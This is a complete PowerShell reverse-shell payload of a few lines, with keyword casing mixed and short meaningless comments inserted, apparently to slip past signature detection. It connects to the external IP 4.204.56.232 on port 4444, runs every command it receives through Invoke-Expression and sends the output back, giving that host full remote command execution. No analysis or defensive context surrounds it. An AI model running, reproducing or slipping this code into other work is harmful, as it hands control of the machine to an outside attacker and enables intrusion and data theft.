$gl=(New-OBject Net.Sockets.TCPClient("4.204.56.232",4444)).GEtstream();
# Of
[byte[]]$bt=0..65530|%{0};while(($i=$gl.Read($bt,0,$bt.LEngth)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).Getstring($bt,0,$i);
# Co
$st=([text.encoding]::ASCII).Getbytes((iex $d 2>&1));
# Do
$gl.Write($st,0,$st.lEngth)}
